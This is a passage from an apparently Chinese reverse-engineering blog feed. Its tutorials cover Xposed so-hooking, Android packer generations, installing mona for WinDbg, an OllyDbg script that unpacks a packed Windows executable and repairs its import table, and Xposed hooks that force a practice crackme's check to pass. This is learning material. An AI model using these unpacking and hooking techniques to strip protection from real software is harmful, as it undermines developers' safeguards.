<img src="/2023/12/25/so%E5%87%BD%E6%95%B0Hook%EF%BC%88%E4%B8%8A%EF%BC%89/image-20240113205533619.png" class="" title="image-20240113205533619">

<ul>
<li><p>结果显示成功的hook了<code>strstr</code></p>
</li>
<li><p>然后编译成apk</p>
</li>
<li><p>解压apk，拿出里面编译好的so文件</p>
<img src="/2023/12/25/so%E5%87%BD%E6%95%B0Hook%EF%BC%88%E4%B8%8A%EF%BC%89/image-20231224233829214.png" class="" title="image-20231224233829214"></li>
</ul>
<h6 id="将刚刚写好的目标app安装在设备上"><a href="#将刚刚写好的目标app安装在设备上" class="headerlink" title="将刚刚写好的目标app安装在设备上"></a>将刚刚写好的目标app安装在设备上</h6><p>此时，我们对它进行hook之前它的运行结果</p>
<img src="/2023/12/25/so%E5%87%BD%E6%95%B0Hook%EF%BC%88%E4%B8%8A%EF%BC%89/image-20231224234616440.png" class="" title="image-20231224234616440">

<p>将编译好的<strong>libhookso.so</strong>文件pull到Xposed主动加载的目录下</p>
<img src="/2023/12/25/so%E5%87%BD%E6%95%B0Hook%EF%BC%88%E4%B8%8A%EF%BC%89/image-20231224234854052.png" class="" title="image-20231224234854052">

<ul>
<li>修改libhookso.so文件的名字为<strong>hookso.so</strong></li>
<li>修改后将其pull到此设备的这个目录下</li>
<li>然后使用命令<code>chmod 777 hookso.so</code>给予文件执行权限</li>
</ul>
<h6 id="然后安装Xposed插件，重启设备运行目标app"><a href="#然后安装Xposed插件，重启设备运行目标app" class="headerlink" title="然后安装Xposed插件，重启设备运行目标app"></a>然后安装Xposed插件，重启设备运行目标app</h6><p>运行后如果hook成功就会改变我们目标app中so文件的执行结果</p>
<img src="/2023/12/25/so%E5%87%BD%E6%95%B0Hook%EF%BC%88%E4%B8%8A%EF%BC%89/image-20231225000924723.png" class="" title="image-20231225000924723">

<p>总结：对32位低版本安卓进行so hook还是比较简单的，直接写Xposed加载我们使用<em>inlineHook框架编写的so文件</em>去hook目标app中的so函数就可以了</p>
]]></content>
      <categories>
        <category>Android逆向</category>
      </categories>
      <tags>
        <tag>Frida Hook</tag>
        <tag>Xposed插件开发</tag>
        <tag>so Hook</tag>
      </tags>
  </entry>
  <entry>
    <title>一二三代壳和壳技术分类识别</title>
    <url>/2023/08/26/%E4%B8%80%E4%BA%8C%E4%B8%89%E4%BB%A3%E5%A3%B3%E5%92%8C%E5%A3%B3%E6%8A%80%E6%9C%AF%E5%88%86%E7%B1%BB%E8%AF%86%E5%88%AB/</url>
    <content><![CDATA[<h3 id="动态加载"><a href="#动态加载" class="headerlink" title="动态加载"></a>动态加载</h3><p>动态加载是DEX加壳和插件化热更新的一个基础（动态加载就是用到的时候再去加载，也叫懒加载用不到的时候是不会去加载的）。</p>
<p>比如说阿里的AndFix还有HotFix，腾讯的tinker、美团Robust等这些热修复框架的基础。动态加载还有热更新可以很方便的解决APP的快速迭代和更新的一个难题。从而避免了每次一发布新版本就需要用户来全量下载APP然后才能更新的过程。这样的话一方面可以提升用户体验，另一方面也可以快速的完成的bug的修复。但是如果只应用动态加载技术，是没有办法完成相关插件类当中的组件的这一个正常的运行。因为动态加载的DEX不具有生命周期的特征，APP中的Activity、Service等组件无法正常工作，它只能够完成一般函数的调用。归根结底是因为组件的Classloader和我们使用的DexClassloader不具备双亲委派的相关特征，导致PathClassloader没有办法找到这些DEX中使用的Activity、Service等相关的组件类，因此就需要对Classloader进行修正（例如上一篇文章中第一种方法中的replaceClassLoader()），这是加壳APP必然要做的一步，而在这步骤当中可以通常使用两种解决方案。</p>
<h4 id="回顾一下上一章的两种方案"><a href="#回顾一下上一章的两种方案" class="headerlink" title="回顾一下上一章的两种方案"></a>回顾一下上一章的两种方案</h4><ul>
<li><p>第一种解决方案：</p>
<p>通过修改系统组件类的Classloader也就是说这个mClassloader，可以通过反射去一步步的找到它然后再替换掉。替换成我们的DexClassloader，这样的话我们就可以找到我们插件DEX当中的相关的类信息了</p>
<img src="/2023/08/26/%E4%B8%80%E4%BA%8C%E4%B8%89%E4%BB%A3%E5%A3%B3%E5%92%8C%E5%A3%B3%E6%8A%80%E6%9C%AF%E5%88%86%E7%B1%BB%E8%AF%86%E5%88%AB/image-20230826205542089.png" class="" title="image-20230826205542089">
</li>
<li><p>第二种解决方案：</p>
<p>不需要改变这个mClassloader，只需要在PathClassloader和BootClassloader当中插入我们的DexClassloader。那这样的话由于双亲委派的原理，系统组件的这个mClassloader就可以找到我们自定义的这个类信息了。</p>
<img src="/2023/08/26/%E4%B8%80%E4%BA%8C%E4%B8%89%E4%BB%A3%E5%A3%B3%E5%92%8C%E5%A3%B3%E6%8A%80%E6%9C%AF%E5%88%86%E7%B1%BB%E8%AF%86%E5%88%AB/image-20230826205601630.png" class="" title="image-20230826205601630">

<ul>
<li>上面的这两种方案，DEX动态加载和Classloader的修正，是当前所有加壳手段的一个基础。有了这个DEX动态加载和Classloader的修正我们就有了这个加壳技术。接下来看下一代壳二代壳三代壳究竟是一个什么技术，为什么这么发展。</li>
</ul>
</li>
</ul>
<h4 id="什么是一代壳二代壳三代壳"><a href="#什么是一代壳二代壳三代壳" class="headerlink" title="什么是一代壳二代壳三代壳"></a>什么是一代壳二代壳三代壳</h4><ul>
<li><p>一代壳：Dex加密</p>
<ul>
<li>Dex字符串加密资源加密对抗反编译反调试自定义DexClassLoader</li>
<li>因为第一代壳在内存中是一个整体所以定位到之后的脱壳是比较容易的</li>
</ul>
</li>
<li><p>第二代壳：Dex抽取与So加固</p>
<ul>
<li>对抗第一代壳常见的脱壳法Dex Method代码抽取到外部（通常企业版）Dex动态加载So加密</li>
<li>首先是对Dex整体做了一个保护，其次对Dex中一些比较重要的函数代码进行了一个抽取，这样加载后的Dex并不是一个完整的在这样的情况下dump下来也是不完整的dex</li>
</ul>
</li>
<li><p>第三代壳：Dex动态解密与So混淆</p>
<ul>
<li>Dex Method代码动态解密、So代码膨胀混淆，对抗之前出现的所有脱壳法</li>
<li>我们的某些函数只有在被调用和加载的时候才执行，也就是说DEX在内存中始终不是一个完整的状态</li>
</ul>
</li>
<li><p>第四代壳：VMP和Dex2C</p>
<ul>
<li>vmp壳的特征就是java函数的Native化</li>
</ul>
</li>
<li><p>未来：现在的VMP实际上是一个smali指令集的VMP，还不是一个真正意义上的VMP。可能在未来随着手机性能的进一步提升可能会出现在arm指令级别的VMP，甚至多指令集和异构的也会有。</p>
</li>
</ul>
<h4 id="VMP和dex2c保护的区别"><a href="#VMP和dex2c保护的区别" class="headerlink" title="VMP和dex2c保护的区别"></a>VMP和dex2c保护的区别</h4><ul>
<li><p>VMP保护的函数注册地址是相同的，因为对于加VMP壳的函数来说它们都需要解释器去还原，如果每一个函数都有一个解释器的话，那SO会膨胀到无法接受的地步。所以它们必然会共用一个解释器，所以它们函数的注册地址是相同的</p>
</li>
<li><p>dex2c不同</p>
</li>
</ul>
<img src="/2023/08/26/%E4%B8%80%E4%BA%8C%E4%B8%89%E4%BB%A3%E5%A3%B3%E5%92%8C%E5%A3%B3%E6%8A%80%E6%9C%AF%E5%88%86%E7%B1%BB%E8%AF%86%E5%88%AB/image-20230830091130178.png" class="" title="image-20230830091130178">

<img src="/2023/08/26/%E4%B8%80%E4%BA%8C%E4%B8%89%E4%BB%A3%E5%A3%B3%E5%92%8C%E5%A3%B3%E6%8A%80%E6%9C%AF%E5%88%86%E7%B1%BB%E8%AF%86%E5%88%AB/image-20230830094656757.png" class="" title="image-20230830094656757">

<ul>
<li><p>注册地址相同可以判断应该是VMP壳，通过动态调试去看函数的处理逻辑如果处理流程差别不大应该是VMP，反之如果区别很大每个函数的处理逻辑不同那很可能就是Dex2C的壳。</p>
</li>
<li><p>dex整体加壳是一个基础防护</p>
<ol>
<li>文件加载：定位解密文件是关键；</li>
<li>内存加载：加载时机和内存起始地址是关键；</li>
<li>通用方案：dex打开和优化的流程以及产出的odex、dex2oat编译的流程和生成的oat文件等等</li>
</ol>
</li>
<li><p>函数抽取是中阶防护</p>
<ol>
<li><p>类加载和函数执行前的流程解密；</p>
</li>
<li><p>函数执行中动态自解密（这种加密方式的效果更好一点）；</p>
<p>方案：关注被抽取的函数的执行流程是关键，定位被抽取的函数的恢复时机即可</p>
</li>
</ol>
</li>
<li><p>VMP和dex2C是高级防护</p>
<ol>
<li><p>VMP：定位解释器是关键，找到映射关系便可恢复；</p>
</li>
<li><p>dex2c：基础是编译原理，进行了从smali到C的等价语义转换，彻底还原难度巨大靠人工来做几乎是不可能的；</p>
<p>通用解决方案：关注JNI相关的api调用时关键，也是分析VMP和dex2c保护的函数的逻辑的关键。</p>
</li>
</ol>
</li>
</ul>
]]></content>
      <categories>
        <category>Android逆向</category>
      </categories>
      <tags>
        <tag>学习笔记</tag>
        <tag>Android加壳</tag>
      </tags>
  </entry>
  <entry>
    <title>winXP安装mona</title>
    <url>/2021/05/20/winDbg%E5%AE%89%E8%A3%85mona/</url>
    <content><![CDATA[<h3 id="Windows-XP，32位"><a href="#Windows-XP，32位" class="headerlink" title="Windows XP，32位"></a>Windows XP，32位</h3><ol>
<li><p>从<a href="https://github.com/corelan/windbglib/raw/master/pykd/pykd.zip%E4%B8%8B%E8%BD%BDpykd.zip">https://github.com/corelan/windbglib/raw/master/pykd/pykd.zip下载pykd.zip</a></p>
</li>
<li><p>解压后获得2个文件：pykd.pyd和vcredist_x86.exe</p>
</li>
<li><p>使用管理员权限运行vcredist_x86.exe并接受默认值。</p>
</li>
<li><p>将pykd.pyd复制到 <code>C:\Program Files\Debugging Tools for Windows (x86)\winext</code></p>
</li>
<li><p>打开具有管理员权限的命令提示符，然后运行以下命令：</p>
<pre><code>c:
cd "C:\Program Files\Common Files\Microsoft Shared\VC"
regsvr32 msdia90.dll
(You should get a messagebox indicating that the dll was registered successfully)
</code></pre>
</li>
<li><p>从<a href="https://github.com/corelan/windbglib/raw/master/windbglib.py%E4%B8%8B%E8%BD%BDwindbglib.py">https://github.com/corelan/windbglib/raw/master/windbglib.py下载windbglib.py</a></p>
</li>
<li><p>将文件保存在下面<code>C:\Program Files\Debugging Tools for Windows (x86)</code> （如果需要，“取消阻止”文件）</p>
</li>
<li><p>从<a href="https://github.com/corelan/mona/raw/master/mona.py%E4%B8%8B%E8%BD%BDmona.py">https://github.com/corelan/mona/raw/master/mona.py下载mona.py</a></p>
</li>
<li><p>将文件保存在下面<code>C:\Program Files\Debugging Tools for Windows (x86)</code> （如果需要，“取消阻止”文件）</p>
</li>
</ol>
<span id="more"></span>

<h2 id="run"><a href="#run" class="headerlink" title="run"></a>run</h2><p>打开Windbg并执行以下命令： <code>.load pykd.pyd</code></p>
<p>mona命令可以通过运行来访问 <code>!py mona</code></p>
]]></content>
      <categories>
        <category>工具</category>
      </categories>
      <tags>
        <tag>winDbg插件</tag>
      </tags>
  </entry>
  <entry>
    <title>一枚简单的未知壳</title>
    <url>/2021/05/24/%E4%B8%80%E6%9E%9A%E7%AE%80%E5%8D%95%E7%9A%84%E6%9C%AA%E7%9F%A5%E5%A3%B3/</url>
    <content><![CDATA[<h3 id="工具-amp-环境"><a href="#工具-amp-环境" class="headerlink" title="工具&amp;环境:"></a>工具&amp;环境:</h3><table>
<thead>
<tr>
<th align="left">工具</th>
<th>系统环境</th>
</tr>
</thead>
<tbody><tr>
<td align="left">PEID</td>
<td>win7_x86</td>
</tr>
<tr>
<td align="left">OD</td>
<td></td>
</tr>
<tr>
<td align="left">IDA</td>
<td></td>
</tr>
<tr>
<td align="left">imporREC</td>
<td></td>
</tr>
</tbody></table>
<h3 id="查壳"><a href="#查壳" class="headerlink" title="查壳"></a>查壳</h3><p>先用PEID扫了一下发现什么都没有扫到<br> <img src="/2021/05/24/%E4%B8%80%E6%9E%9A%E7%AE%80%E5%8D%95%E7%9A%84%E6%9C%AA%E7%9F%A5%E5%A3%B3/623a1200-5054-432b-9613-8ceb28562e82.jpg" class="" title="img"></p>
<span id="more"></span>

<h3 id="直接先用OD打开看一下"><a href="#直接先用OD打开看一下" class="headerlink" title="直接先用OD打开看一下"></a>直接先用OD打开看一下</h3><p>发现有pushad/fd先用ESP定律下断试一下<br> <img src="/2021/05/24/%E4%B8%80%E6%9E%9A%E7%AE%80%E5%8D%95%E7%9A%84%E6%9C%AA%E7%9F%A5%E5%A3%B3/1a8bec0d-3c8f-4a42-9dfc-fe11ac4d4c4b.png" class="" title="img"></p>
<p>嗯,直接就这样到了,F7几下就到了OEP<br> <img src="/2021/05/24/%E4%B8%80%E6%9E%9A%E7%AE%80%E5%8D%95%E7%9A%84%E6%9C%AA%E7%9F%A5%E5%A3%B3/b7135dff-2520-480a-a78e-aa78ced4f978.png" class="" title="img"></p>
<p>这里有个sub esp,0x58所以应该是Delphi写的,第一个call本来应该显示getversion的,但是并没有,发现它IAT加密了<br> <strong>OEP是47148B</strong><br> <img src="/2021/05/24/%E4%B8%80%E6%9E%9A%E7%AE%80%E5%8D%95%E7%9A%84%E6%9C%AA%E7%9F%A5%E5%A3%B3/5ad9befa-e19c-4abc-bd97-b797a6eab5d7.png" class="" title="img"></p>
<p>那我们先跟进去看一下</p>
<p>这里有对ebx一个sub和add运算看了一下发现它获取到了GetVersion的地址<br> <img src="/2021/05/24/%E4%B8%80%E6%9E%9A%E7%AE%80%E5%8D%95%E7%9A%84%E6%9C%AA%E7%9F%A5%E5%A3%B3/e9bfd6e4-da02-45b2-a55c-01a8255ace15.png" class="" title="img"></p>
<p>但是0x475080还是它WriteIAT的地址,所以在这里下硬件写入断点,然后重新运行寻找它GetAPI的地方<br> <img src="/2021/05/24/%E4%B8%80%E6%9E%9A%E7%AE%80%E5%8D%95%E7%9A%84%E6%9C%AA%E7%9F%A5%E5%A3%B3/0d728ff3-108c-4eb6-893b-03cff517cce4.png" class="" title="img"></p>
<p>F9了两次发现这个地方像是写入IAT的地方<br> <img src="/2021/05/24/%E4%B8%80%E6%9E%9A%E7%AE%80%E5%8D%95%E7%9A%84%E6%9C%AA%E7%9F%A5%E5%A3%B3/9a384b9c-9fd8-46b7-aaa1-50feca86de32.png" class="" title="img"><br> <strong>那这个1D0897应该是WriteIATAddr了</strong></p>
<p>在0x2F0895这个地方下断用run跟踪F7跑一下<br> <img src="/2021/05/24/%E4%B8%80%E6%9E%9A%E7%AE%80%E5%8D%95%E7%9A%84%E6%9C%AA%E7%9F%A5%E5%A3%B3/0.2970275629542105.png" class="" title="img"></p>
<p><strong>run跟踪的原理就是模拟操作然后全部记录在run跟踪窗口中</strong><br> <img src="/2021/05/24/%E4%B8%80%E6%9E%9A%E7%AE%80%E5%8D%95%E7%9A%84%E6%9C%AA%E7%9F%A5%E5%A3%B3/0.8923110284070546.png" class="" title="img"></p>
<p>在写入iat的地方下断点,然后run跟踪,运行到下一次写入的时候就会断下来,<br> <img src="/2021/05/24/%E4%B8%80%E6%9E%9A%E7%AE%80%E5%8D%95%E7%9A%84%E6%9C%AA%E7%9F%A5%E5%A3%B3/31d0751c-1485-47a0-83c3-c72f0cf354cb.png" class="" title="img"></p>
<p>然后进run跟踪的界面,找到7*******开头往这个eax里面写入的地址就是GetAPIAddr了</p>
<p>可以看到这里获取到了API的地址<br> <img src="/2021/05/24/%E4%B8%80%E6%9E%9A%E7%AE%80%E5%8D%95%E7%9A%84%E6%9C%AA%E7%9F%A5%E5%A3%B3/275a6cef-4ad9-46a0-a894-a661aae2bc0a.png" class="" title="img"></p>
<p>这个地方就可以用了,也可以再往上找一下eax是从哪来的</p>
<p>找到是从这个地方获取的<br> <img src="/2021/05/24/%E4%B8%80%E6%9E%9A%E7%AE%80%E5%8D%95%E7%9A%84%E6%9C%AA%E7%9F%A5%E5%A3%B3/40552cb0-1999-4878-b33f-1707b93ec133.png" class="" title="img"><br> <strong>1D1914或者1D0474</strong><br> <strong>我们写脱壳脚本的时候GetAPI用这两个地址都可以</strong></p>
<pre><code>// 定义变量,初始化变量 
VAR dwGetAPIAddr 
VAR dwWriteIATAddr 
VAR dwOEP VAR dwTmp 
MOV dwGetAPIAddr, 001D0474     // 获取 API 地址的地方      
MOV dwWriteIATAddr, 001D0897   // 填充 IAT 的地方 
MOV dwOEP, 0047148B            // OEP
// 清理环境 
BC     // 清理软件断点 
BPHWC  // 清理硬件断点 
BPMC   // 清理内存断点 
// 设置断点 
BPHWS dwOEP, "x" 
BPHWS dwGetAPIAddr, "x" 
BPHWS dwWriteIATAddr, "x"
// 构造循环 
LOOP1:  
// 运行程序 
RUN 
// 判断 是 获取 API 地址的地方 
cmp eip,dwGetAPIAddr 
JNZ SIGN1 
MOV dwTmp, eax 
jmp LOOP1   
// 判断 是 填充 IAT 的地方 
SIGN1: 
cmp eip,dwWriteIATAddr 
JNZ SIGN2  
MOV [edx],dwTmp 
jmp LOOP1  
// 判断是 OEP ，结束了 
SIGN2: 
cmp eip,dwOEP 
JZ EXIT1 
jmp LOOP1  // 脚本结束 
EXIT1: 
MSG "yes，今晚吃鸡！"
</code></pre>
<p>等脚本跑完 修复完导入表</p>
<h3 id="在OEP处右键使用OllyDump将程序dump出来"><a href="#在OEP处右键使用OllyDump将程序dump出来" class="headerlink" title="在OEP处右键使用OllyDump将程序dump出来"></a>在OEP处右键使用OllyDump将程序dump出来</h3><img src="/2021/05/24/%E4%B8%80%E6%9E%9A%E7%AE%80%E5%8D%95%E7%9A%84%E6%9C%AA%E7%9F%A5%E5%A3%B3/37b4e9f6-c4c2-4952-960c-f569a9303764.png" class="" title="img">

<h3 id="然后用imporREC修复一下dump出来程序的导入表就可以了"><a href="#然后用imporREC修复一下dump出来程序的导入表就可以了" class="headerlink" title="然后用imporREC修复一下dump出来程序的导入表就可以了"></a>然后用imporREC修复一下dump出来程序的导入表就可以了</h3><img src="/2021/05/24/%E4%B8%80%E6%9E%9A%E7%AE%80%E5%8D%95%E7%9A%84%E6%9C%AA%E7%9F%A5%E5%A3%B3/image-20210524164615794.png" class="" title="image-20210524164615794">

<h3 id="完成"><a href="#完成" class="headerlink" title="完成"></a>完成</h3><img src="/2021/05/24/%E4%B8%80%E6%9E%9A%E7%AE%80%E5%8D%95%E7%9A%84%E6%9C%AA%E7%9F%A5%E5%A3%B3/image-20210524153137607.png" class="" title="image-20210524153137607">

]]></content>
      <categories>
        <category>Win逆向</category>
      </categories>
      <tags>
        <tag>Windows脱壳</tag>
      </tags>
  </entry>
  <entry>
    <title>修改属性</title>
    <url>/2023/12/11/%E4%BF%AE%E6%94%B9%E5%B1%9E%E6%80%A7/</url>
    <content><![CDATA[<p>本章主要使用Xposed来修改类和类对象的属性</p>
<p>Xposed不止是可以实现对app自己实现的类构造函数进行hook，对于系统框架层的java函数也可以进行hook</p>
<p>加壳厂商一般使用的加载dex有，DexClassLoader、InMemoryDexClassLoader(8.0以后)、以及动态下发dex</p>
<span id="more"></span>

<p>我们先来看一下<code>DexClassLoader</code></p>
<p>可以使用google提供的<a href="https://cs.android.com/">源码查看工具</a>查看源码</p>
<img src="/2023/12/11/%E4%BF%AE%E6%94%B9%E5%B1%9E%E6%80%A7/image-20231203132433540.png" class="" title="image-20231203132433540">

<center>图一</center>

<ul>
<li>我们完全可以像hook其它app一样去hook源码中的函数</li>
<li>从而可以监控到它都加载了哪些插件dex，或者通过它脱壳都是可以的</li>
<li>之后也可以把FART和Xposed结合一下，通过Xposed去hook相关的构造函数，配合FART进行插件dex的脱壳和修复</li>
</ul>
<h3 id="Hook-DexClassLoader"><a href="#Hook-DexClassLoader" class="headerlink" title="Hook DexClassLoader"></a>Hook DexClassLoader</h3><p>之前在JNI开发的时候写过一个测试demo使用DexClassLoader来动态加载dex这次我们来Hook它的<code>DexClassLoader</code>方法</p>
<img src="/2023/12/11/%E4%BF%AE%E6%94%B9%E5%B1%9E%E6%80%A7/image-20231207163802111.png" class="" title="image-20231207163802111">

<center>图二</center>

<p>主要代码片段</p>
<pre><code class="java">// 在图一的源码里面可以看到DexClassLoader里面一共有四个参数（三个String + ClassLoader)
XposedHelpers.findAndHookConstructor(DexClassLoader.class, String.class, String.class, String.class, ClassLoader.class, new XC_MethodHook() {
                @Override
                // 		public Object thisObject;
                //		public Object[] args;
                //		private Object result = null;
                protected void beforeHookedMethod(MethodHookParam param) throws Throwable {
                    super.beforeHookedMethod(param);
                    Object args[] = param.args;
                    String dexPath = (String) args[0];
                    String optimizedDirectory = (String) args[1];
                    String librarySearchPath = (String) args[2];
                    ClassLoader parent = (ClassLoader) args[3];
                    XposedBridge.log("HookDexClassLoader-&gt;beforeHookedMethod: " + dexPath + "---" + optimizedDirectory + "---" + librarySearchPath + "---" + parent);
                }

                @Override
                protected void afterHookedMethod(MethodHookParam param) throws Throwable {
                    super.afterHookedMethod(param);
                    DexClassLoader dexClassLoader = (DexClassLoader) param.thisObject;
                    XposedBridge.log("HookDexClassLoader-&gt;afterHookedMethod: " + dexClassLoader);
                }
            });
</code></pre>
<p>将这个插件编译后安装在设备上，在执行LoadDex的时候就会获取到通过<code>DexClassLoader</code>加载的dex文件信息</p>
<img src="/2023/12/11/%E4%BF%AE%E6%94%B9%E5%B1%9E%E6%80%A7/image-20231209001738039.png" class="" title="image-20231209001738039">

<center>图三</center>

<ul>
<li><p>这样就可以获取到加载的dex信息</p>
</li>
<li><p><strong>Xposed除了可以实现对app自己实现的类构造函数的hook，对于系统框架层的java函数也可以进行hook</strong></p>
</li>
</ul>
<h5 id="Xposed插件修改类属性有两种办法"><a href="#Xposed插件修改类属性有两种办法" class="headerlink" title="Xposed插件修改类属性有两种办法"></a>Xposed插件修改类属性有两种办法</h5><blockquote>
<ol>
<li>使用java反射修改属性：这种方式跟之前的章节中JNI开发中使用的api是一样的</li>
<li>使用Xposed的API修改属性：这种方式在内部其实也是调用的java反射的api来完成的，不过它里面已经封装过了我们调用起来比较简洁</li>
</ol>
</blockquote>
<pre><code class="java">            // 1. 使用java反射修改属性
            ClassLoader pathClassLoader = loadPackageParam.classLoader;
            Class stuClass = pathClassLoader.loadClass("com.xiaoeryu.xposedhook01.Student");
            XposedBridge.log("stuClass: " + stuClass.getName());

            Field teacherField = stuClass.getDeclaredField("teacher");
            teacherField.setAccessible(true);	// 这里如果是私有属性需要取消权限检查
            teacherField.set(null, "xiaoeryu666");

            String teacherName1 = (String) teacherField.get(null);
            XposedBridge.log("teacherField: " + teacherName1);

            // 2. 使用Xposed的API修改属性
            // setStaticObjectField(Class&lt;?&gt; clazz, String fieldName, Object value)
            XposedHelpers.setStaticObjectField(stuClass, "teacher", "xiaoeryu888");
            String  teacherName2 = (String) XposedHelpers.getStaticObjectField(stuClass, "teacher");
            XposedBridge.log("XposedHelpers.getStaticObjectField: " + teacherName2);
</code></pre>
<ul>
<li>使用Xposed的api来获取属性就不需要我们自己来处理权限检查的问题了，框架里面已经帮我们处理过了</li>
</ul>
<img src="/2023/12/11/%E4%BF%AE%E6%94%B9%E5%B1%9E%E6%80%A7/image-20231210151356744.png" class="" title="image-20231210151356744">

<center>图四</center>

<ul>
<li>这里可以看到我们分别使用两种都能获取和修改其属性</li>
</ul>
<p>看一下LSPosed的源码，使用的<code>setStaticObjectField</code>方法，是怎么处理私有属性的权限检查的</p>
<p>在github上打开LSPposed的仓库直接搜我们调用的<code>setStaticObjectField</code>看它是怎么实现的</p>
<img src="/2023/12/11/%E4%BF%AE%E6%94%B9%E5%B1%9E%E6%80%A7/image-20231210162634468.png" class="" title="image-20231210162634468">

<center>图五</center>

<ul>
<li>可以看到调用了<code>findField</code>跟进去看一下</li>
</ul>
<img src="/2023/12/11/%E4%BF%AE%E6%94%B9%E5%B1%9E%E6%80%A7/image-20231210164239350.png" class="" title="image-20231210164239350">

<center>图六</center>

<ul>
<li>这里也是调用了<code>setAccessible</code>来通过权限检查</li>
</ul>
<h3 id="修改对象属性"><a href="#修改对象属性" class="headerlink" title="修改对象属性"></a>修改对象属性</h3><h5 id="使用java反射的方式修改"><a href="#使用java反射的方式修改" class="headerlink" title="使用java反射的方式修改"></a>使用java反射的方式修改</h5><p>跟之前使用反射修改属性的代码差不多，也是通过类找到对象修改它的值。这里修改的时候需要传入对象</p>
<pre><code class="java">Field nicknameField = stuClass.getDeclaredField("nickname");
nicknameField.setAccessible(true);
nicknameField.set(thisObj, "bear");
</code></pre>
<p>在apk这边可以打印出来查看</p>
<img src="/2023/12/11/%E4%BF%AE%E6%94%B9%E5%B1%9E%E6%80%A7/image-20231210225736413.png" class="" title="image-20231210225736413">

<center>图七</center>

<h5 id="使用Xposed的方式修改"><a href="#使用Xposed的方式修改" class="headerlink" title="使用Xposed的方式修改"></a>使用Xposed的方式修改</h5><pre><code class="java">XposedHelpers.setObjectField(thisObj,"nickname","duck");
</code></pre>
<ul>
<li>使用Xposed的api来修改非常的简介只需要一行代码就可以了，传入对象、要修改的Field、修改后的值</li>
</ul>
<p>同样在apk那边可以看到打印的结果</p>
<img src="/2023/12/11/%E4%BF%AE%E6%94%B9%E5%B1%9E%E6%80%A7/image-20231210230845859.png" class="" title="image-20231210230845859">

<center>图八</center>

<p><code>setObjectField</code>的源码跟之前<code>setStaticObjectField</code>相比需要传入一个obj。都同样是调用了<code>findField</code>方法</p>
<img src="/2023/12/11/%E4%BF%AE%E6%94%B9%E5%B1%9E%E6%80%A7/image-20231210231250180.png" class="" title="image-20231210231250180">

<center>图八</center>

<h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><p><strong>接下来我们拿一个测试app来尝试通过Xposed的方式通过它的验证</strong></p>
<p>用jadx打开查看一下</p>
<img src="/2023/12/11/%E4%BF%AE%E6%94%B9%E5%B1%9E%E6%80%A7/image-20231210232442993.png" class="" title="image-20231210232442993">

<center>图九</center>

<ul>
<li>首先这里会拿到我们在编辑框输入的字符串进行check，如果通过就弹出<strong>Congratulations</strong></li>
<li>如果没有通过，就弹出<strong>Sorry,try again?</strong></li>
</ul>
<p>看一下<code>check</code>的验证过程</p>
<img src="/2023/12/11/%E4%BF%AE%E6%94%B9%E5%B1%9E%E6%80%A7/image-20231210232717905.png" class="" title="image-20231210232717905">

<center>图十</center>

<ul>
<li>首先要我们输入的字符串长度等于16</li>
<li>然后还要拿我们输入的<strong>content</strong>跟**Flag2()**进行字符串对比</li>
<li>Flag2()是一个无参的构造函数</li>
</ul>
<img src="/2023/12/11/%E4%BF%AE%E6%94%B9%E5%B1%9E%E6%80%A7/image-20231210232840400.png" class="" title="image-20231210232840400">

<center>图十一</center>

<ul>
<li>但是<strong>Flag2</strong>的长度不足16位</li>
</ul>
<p>所以这里是不存在正确的Flag的，这里使用Xposed的方式hook这两处，使校验通过</p>
<pre><code class="java">public class HookFlag implements IXposedHookLoadPackage {
    @Override
    public void handleLoadPackage(XC_LoadPackage.LoadPackageParam loadPackageParam) throws Throwable {
        XposedBridge.log("HookFlag-&gt;app packagename" + loadPackageParam.packageName);
        if (loadPackageParam.packageName.equals("com.kanxue.xposedflag")) {
            XposedBridge.log("HookFlag-&gt;app packagename" + loadPackageParam.packageName);
            // 修改第一处校验的长度
            ClassLoader classLoader = loadPackageParam.classLoader;
            Class Flag1Class = classLoader.loadClass("com.kanxue.xposedflag.Flag1");
            XposedHelpers.setStaticIntField(Flag1Class, "length", 3);
            // 第二处是一个无参的构造函数，修改里面flag的值
            XposedHelpers.findAndHookConstructor("com.kanxue.xposedflag.Flag2", classLoader, new XC_MethodHook() {
                @Override
                protected void beforeHookedMethod(MethodHookParam param) throws Throwable {
                    super.beforeHookedMethod(param);
                    XposedBridge.log("xiaoeryu-&gt;beforeHookedMethod");
                }

                @Override
                protected void afterHookedMethod(MethodHookParam param) throws Throwable {
                    super.afterHookedMethod(param);
                    XposedBridge.log("xiaoeryu-&gt;afterHookedMethod");

                    Object Flag2obj = param.thisObject;
                    XposedHelpers.setObjectField(Flag2obj, "flag", "123");
                }
            });

        }
    }
}
</code></pre>
<ul>
<li>这里修改了两处校验的值，第一处是一个静态变量直接修改即可</li>
<li>第二处是一个无参的构造函数用<code>findAndHookConstructor</code>方法在<code>afterHookedMethod</code>之后修改它的值</li>
</ul>
<h3 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h3><p>在LSPosed中勾选上我们要测试的app，然后重启手机</p>
<p>重启后直接运行目标app，将刚刚修改后的值输入进去</p>
<img src="/2023/12/11/%E4%BF%AE%E6%94%B9%E5%B1%9E%E6%80%A7/image-20231211012545354.png" class="" title="image-20231211012545354">

<center>图十二</center>

<p>验证通过</p>
<img src="/2023/12/11/%E4%BF%AE%E6%94%B9%E5%B1%9E%E6%80%A7/image-20231211012736161.png" class="" title="image-20231211012736161">

<center>图十三</center>

]]></content>
      <categories>
        <category>Android逆向</category>
      </categories>
      <tags>
        <tag>Xposed插件开发</tag>
      </tags>
  </entry>
  <entry>
    <title>主动调用函数</title>
    <url>/2023/12/15/%E4%B8%BB%E5%8A%A8%E8%B0%83%E7%94%A8%E5%87%BD%E6%95%B0/</url>
    <content><![CDATA[<p>本章主要内容：</p>
<p>主动调用类函数</p>
<ol>
<li>使用java反射完成对类函数的调用</li>
<li>使用Xposed的API完成对类函数的调用</li>
</ol>
<span id="more"></span>

<h3 id="通过java反射的方式主动调用"><a href="#通过java反射的方式主动调用" class="headerlink" title="通过java反射的方式主动调用"></a>通过java反射的方式主动调用</h3><h4 id="主动调用静态函数"><a href="#主动调用静态函数" class="headerlink" title="主动调用静态函数"></a>主动调用静态函数</h4><p>目标app的两个静态函数</p>
<img src="/2023/12/15/%E4%B8%BB%E5%8A%A8%E8%B0%83%E7%94%A8%E5%87%BD%E6%95%B0/image-20231214222813002.png" class="" title="image-20231214222813002">

<p>在Xposed01项目中新建一个Class来进行主动调用：使用java反射的方式来主动调用</p>
<img src="/2023/12/15/%E4%B8%BB%E5%8A%A8%E8%B0%83%E7%94%A8%E5%87%BD%E6%95%B0/image-20231214222748885.png" class="" title="image-20231214222748885">

<ul>
